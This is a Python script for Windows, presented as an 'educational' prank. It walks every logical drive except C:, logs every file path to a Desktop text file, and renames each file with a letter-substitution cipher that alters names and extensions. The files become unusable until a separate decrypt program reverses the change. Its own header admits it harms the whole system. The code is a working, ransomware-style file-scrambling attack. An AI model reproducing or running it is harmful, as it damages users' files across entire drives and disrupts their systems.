'''
    
    **********        O N L Y     F O R      E D U C A T I O N A L        P U R P O S E       ***********

    This python program is a fun program ONLY FOR EDUCATIONAL PURPOSE and prank. 
    This is really really harms the whole system. 
    This change the files name to some other name and the file extension is also altered so that the file cannot be opened until decrypted.
    All the paths traversed is stored in a textfile in desktop.
    USE DECRYPT PROGRAM TO BRING BACK THE FILES NORMALLY.
    Use it with caution.!! THIS JUST TAKES AROUND 10 SECONDS TO TRAVERSE A NORMAL PC.
'''



from os import listdir,path,rename
from getpass import getuser 
from random import shuffle
from win32api import GetLogicalDriveStrings

username = getuser()  			#Get username of system

def getListOfFiles(dirName):
    try:
        listOfFile = listdir(dirName)    #Getting directory list
        allFiles = list()
                                        
        for entry in listOfFile:				# Iterate over all the entries
            if entry=="System Volume Information" or entry=="Programs" or entry=="$RECYCLE.BIN":         #Exceptional folders
                continue 
            fullPath = path.join(dirName, entry)             # Create full path
            if path.isdir(fullPath):         #If directory the get subfiles
                allFiles = allFiles + getListOfFiles(fullPath)
            else:
                allFiles.append(fullPath)                    
        return allFiles        
    except OSError:				#Exception for encrypted and unaccessable drives
        pass
    return []



drivess1 = GetLogicalDriveStrings()         #Disk drives 
drivess1 = drivess1.split('\000')[:-1]                 #On characters enough
shuffle(drivess1)                             #shuffling the drive list
drivess1.remove("C:\\")                              #Removing C drive due to lot of permission issues

for drives in drivess1:
    dirName1=drives
    listOfFiles = getListOfFiles(dirName1)

    out_file="C:\\Users\\"+username+"\\Desktop\\Tempfile.txt"			#Storing path names to a file

    A=""
    B=""
    temp_elem=""
    temp_elem1=""
    elem1=""

#Dictionary file for mapping

    dict_val={"A":"P","B":"I","C":"J","D":"C","E":"O","F":"N","G":"W","H":"Q","I":"V","J":"M","K":"E","L":"K","M":"U","N":"T","O":"D","P":"X","Q":"H","R":"A","S":"R","T":"S","U":"B","V":"G","W":"Y","X":"Z","Y":"F","Z":"L",".":"."}


    for elem in listOfFiles:			#Traversing each path
        f=open(out_file,"a")			#Opening file in append mode
        x=elem.rfind("\\")			#Fining last occuring \\
        temp_elem=elem
        f.write(temp_elem+"\n")			#Writing path to file
        f.close()
        elem1=elem[x+1:]			#Finding the file name and extension for encryption
        print(elem1)
        elem1=elem1.upper()
        for p in elem1:
            if p in dict_val:
                A=A+dict_val[p]			#Mapping key to element
            else:
                A=A+p				#If other characters which are not specified then use same character
        A=A.lower()
        print(A)
        temp_elem1=temp_elem[:x]+"\\"+A		#New path for files
        rename(temp_elem,temp_elem1)		#Renaming the file
        temp_elem1=""
        temp_elem=""
        A=""



